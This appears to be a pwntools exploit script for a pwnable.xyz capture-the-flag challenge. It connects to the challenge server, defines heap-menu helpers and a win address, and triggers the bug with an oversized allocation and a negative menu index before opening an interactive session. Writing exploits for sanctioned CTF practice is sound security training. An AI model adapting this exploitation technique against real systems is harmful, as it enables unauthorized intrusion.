#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template challenge
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('challenge')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b *0x00400a8d
b *0x00400ae1
b *0x00400b29
b *0x00400be0
b *0x00400bc0
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

#io = start()
io = remote('svc.pwnable.xyz', 30007)

def alloc(size):
    io.sendlineafter(b'>', b'1')
    io.sendlineafter(b'Size:', str(size))

def free():
    io.sendlineafter(b'>', b'2')

def write(data):
    io.sendlineafter(b'>', b'3')
    io.send(data)

def dump():
    io.sendlineafter(b'>', b'4')

win = 0x00400a31

alloc(4196913)
#free()
io.sendlineafter(b'>', b'-2')

io.interactive()

